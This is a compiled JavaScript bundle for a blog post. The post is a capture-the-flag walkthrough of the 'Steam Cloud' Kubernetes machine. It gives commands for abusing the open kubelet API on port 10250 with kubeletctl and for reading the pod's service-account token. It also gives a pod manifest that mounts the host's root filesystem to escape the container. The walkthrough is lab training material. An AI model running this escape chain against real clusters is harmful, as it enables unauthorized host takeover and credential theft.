"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[7663],{1242:e=>{e.exports=JSON.parse('{"permalink":"/Blog/blog/SteamCloud","editUrl":"https://github.com/danae-pan/Blog/blog/SteamCloud.md","source":"@site/blog/SteamCloud.md","title":"Steam Cloud","description":"Task 1","date":"2025-08-09T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"linux","permalink":"/Blog/blog/tags/linux"}],"readingTime":3.855,"hasTruncateMarker":false,"authors":[],"frontMatter":{"title":"Steam Cloud","date":"2025-08-09T00:00:00.000Z","tags":["easy","linux"]},"unlisted":false,"nextItem":{"title":"Two Million","permalink":"/Blog/blog/TwoMillion"}}')},2181:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-s-2-a76f4a0d8c8c3c6f383425204b43d21b.png"},4127:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>a,default:()=>l,frontMatter:()=>r,metadata:()=>s,toc:()=>d});var s=n(1242),o=n(4848),i=n(8453);const r={title:"Steam Cloud",date:new Date("2025-08-09T00:00:00.000Z"),tags:["easy","linux"]},a=void 0,c={authorsImageUrls:[]},d=[{value:"Task 1",id:"task-1",level:3},{value:"Task 2",id:"task-2",level:3},{value:"Task 3",id:"task-3",level:3},{value:"Task 4",id:"task-4",level:3},{value:"Task 5",id:"task-5",level:3},{value:"Task 6",id:"task-6",level:3},{value:"Task 7",id:"task-7",level:3}];function h(e){const t={a:"a",code:"code",h3:"h3",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(t.h3,{id:"task-1",children:"Task 1"}),"\n",(0,o.jsx)(t.p,{children:"Which containerization framework are the services on TCP ports 2379 and 2380 components of?"}),"\n",(0,o.jsxs)(t.p,{children:["Targeting those two specific ports with ",(0,o.jsx)(t.code,{children:"nmap -p 2379,2380 <target_ip>"})," we see that the services running are the ",(0,o.jsx)(t.code,{children:"etcd-client"})," and ",(0,o.jsx)(t.code,{children:"etcd-server"})," accordingly. The etcd service is a key-value store used as Kubernetes' backing store for all cluster data."]}),"\n",(0,o.jsx)(t.p,{children:(0,o.jsx)(t.img,{alt:"alt text",src:n(5454).A+"",width:"661",height:"202"})}),"\n",(0,o.jsx)(t.h3,{id:"task-2",children:"Task 2"}),"\n",(0,o.jsx)(t.p,{children:"How many pods are running on the target system?"}),"\n",(0,o.jsxs)(t.p,{children:["One of Kubernetes components is the Kubelet API that is used by the control plane which manages nodes, the worker machines where pods run. Thus, we can use the Kubelet API to list all pods running on nodes. Kubelet API runs on port 10250 that we can validate its state by ",(0,o.jsx)(t.code,{children:"nmap -p 10250 -sS <target_ip>"}),"."]}),"\n",(0,o.jsx)(t.p,{children:(0,o.jsx)(t.img,{alt:"alt text",src:n(2181).A+"",width:"1326",height:"374"})}),"\n",(0,o.jsxs)(t.p,{children:["To find out the number of pods we can then run ",(0,o.jsx)(t.code,{children:"curl -k -X GET https://<target_ip>:10250/pods"}),' this will return a json response which we can then store in a json file and sort it to have a better overview of the information. Searching this file with for "hostIP" will return the matches for the IP\'s of the host of pods which essentially is the number of pods.']}),"\n",(0,o.jsx)(t.h3,{id:"task-3",children:"Task 3"}),"\n",(0,o.jsx)(t.p,{children:'Which pod in the default namespace allows code execution? Choose from "etcd-steamcloud", "nginx", "kube-controller-manager-steamcloud", and "storage-provisioner".'}),"\n",(0,o.jsx)(t.p,{children:'We can eliminate the pod by searching on the json file stored previously for "namespace: "default"" for the 4 potential pods. The one that matches both conditions is the pod we are looking for.'}),"\n",(0,o.jsx)(t.h3,{id:"task-4",children:"Task 4"}),"\n",(0,o.jsx)(t.p,{children:"In which directory is the service account access token and certificate stored inside a Kubernetes pod?"}),"\n",(0,o.jsxs)(t.p,{children:["Looking under the volumeMounts field, we see the directory ",(0,o.jsx)(t.code,{children:"/var/run/secrets/kubernetes.io/serviceaccount/"})," mounted with the name ",(0,o.jsx)(t.code,{children:"kube-api-access-zwtvf"}),". Searching for this name under volumes reveals a projected volume that contains two sources: a serviceAccountToken stored in token, and a configMap providing the CA certificate stored in ca.crt. These files are the pod\u2019s service account token and certificate, used to authenticate and interact with the Kubernetes API server."]}),"\n",(0,o.jsx)(t.h3,{id:"task-5",children:"Task 5"}),"\n",(0,o.jsx)(t.p,{children:'When creating a Kubernetes Pod, which Volume type can be used to mount a file or directory from the host\'s filesystem onto the Pod? Choose from "gcePersistentDisk", "hostPath", "secret", or "emptyDir"'}),"\n",(0,o.jsxs)(t.p,{children:["From the same json file, in the pod\u2019s volumeMounts, ",(0,o.jsx)(t.code,{children:"/root"})," is mounted from a volume named ",(0,o.jsx)(t.code,{children:"flag"}),". Looking up ",(0,o.jsx)(t.code,{children:"flag"})," under volumes shows it is defined with ",(0,o.jsx)(t.code,{children:'"hostPath": { "path": "/opt/flag" }'}),", meaning the volume type is hostPath, which mounts files/directories from the host filesystem into the Pod."]}),"\n",(0,o.jsx)(t.h3,{id:"task-6",children:"Task 6"}),"\n",(0,o.jsx)(t.p,{children:"Submit the flag located in the user user's home directory."}),"\n",(0,o.jsxs)(t.p,{children:["We can use the tool ",(0,o.jsx)(t.a,{href:"https://github.com/cyberark/kubeletctl",children:"kubeletctl"})," to execute into the vulnerable pod by ",(0,o.jsx)(t.code,{children:"./kubeletctl_<binary_for_os>   --server <target_ip>   --port 10250   exec -p nginx -n default -c nginx -- sh -lc"})," that runs a shell inside the nginx container and in the nginx pod. In case you built from source, you need to be under the build directory and choose the correct binary file depending on your operating system. We can then navigate to the ",(0,o.jsx)(t.code,{children:"/root"})," directory and get the user's flag."]}),"\n",(0,o.jsx)(t.h3,{id:"task-7",children:"Task 7"}),"\n",(0,o.jsx)(t.p,{children:"Submit the flag located in root's home directory."}),"\n",(0,o.jsxs)(t.p,{children:["In order to answer this question, we need to escape from the containirised environment to the target machine. In the pod we are in and navigating to the directory ",(0,o.jsx)(t.code,{children:"/var/run/secrets/kubernetes.io/serviceaccount/"})," we can obtain both the token and the certificate. These credentials can be used to communicate directly with the Kubernetes API server. With the correct permissions, we can create a pod that mounts the host\u2019s root filesystem (/) inside the container."]}),"\n",(0,o.jsx)(t.p,{children:"First, create the pod manifest such as:"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{children:'cat > pod-hostfs.json <<\'JSON\'\n{\n  "apiVersion": "v1",\n  "kind": "Pod",\n  "metadata": { "name": "bb2-escape" },\n  "spec": {\n    "containers": [\n      {\n        "name": "bb",\n        "image": "nginx:1.14.2",\n        "imagePullPolicy": "Never",\n        "command": ["sh","-lc","sleep 3600000"],\n        "volumeMounts": [\n          { "name": "host", "mountPath": "/node-host" }\n        ]\n      }\n    ],\n    "volumes": [\n      { "name": "host", "hostPath": { "path": "/", "type": "Directory" } }\n    ]\n  }\n}\nJSON\n'})}),"\n",(0,o.jsxs)(t.p,{children:["This pod mounts the host's ",(0,o.jsx)(t.code,{children:"/"})," directory at ",(0,o.jsx)(t.code,{children:"/node-host"})," inside the container. Then, after storing the ",(0,o.jsx)(t.code,{children:"TOKEN"})," and ",(0,o.jsx)(t.code,{children:"APISRV"}),' as environmental variables and the certificate in a file called "ca.crt", deploy the pod using the API server:']}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{children:'curl --cacert ca.crt -H "Authorization: Bearer $TOKEN" \\\n     -H "Content-Type: application/json" \\\n     -X POST "$APISRV/api/v1/namespaces/default/pods" \\\n     -d @pod-hostfs.json\n'})}),"\n",(0,o.jsx)(t.p,{children:"After executing into the pod using the following command:"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{children:"./kubeletctl_<binary_for_os> \\\n  --server <target_ip> --port 10250 \\\n  exec -p bb2-escape -n default -c bb -- sh -lc 'id && mount | head && ls -la /node-host'\n"})}),"\n",(0,o.jsxs)(t.p,{children:["the ",(0,o.jsx)(t.code,{children:"/node-host"})," will be the host's root filesystem. Thus, to get the root flag, navigate to the ",(0,o.jsx)(t.code,{children:"node-host/root"})," directory and grab it by running ",(0,o.jsx)(t.code,{children:"cat root.txt"}),"."]})]})}function l(e={}){const{wrapper:t}={...(0,i.R)(),...e.components};return t?(0,o.jsx)(t,{...e,children:(0,o.jsx)(h,{...e})}):h(e)}},5454:(e,t,n)=>{n.d(t,{A:()=>s});const s=n.p+"assets/images/image-s-1-06d7de6b6329b86495c8a0f630d5aba2.png"},8453:(e,t,n)=>{n.d(t,{R:()=>r,x:()=>a});var s=n(6540);const o={},i=s.createContext(o);function r(e){const t=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function a(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:r(e.components),s.createElement(i.Provider,{value:t},e.children)}}}]);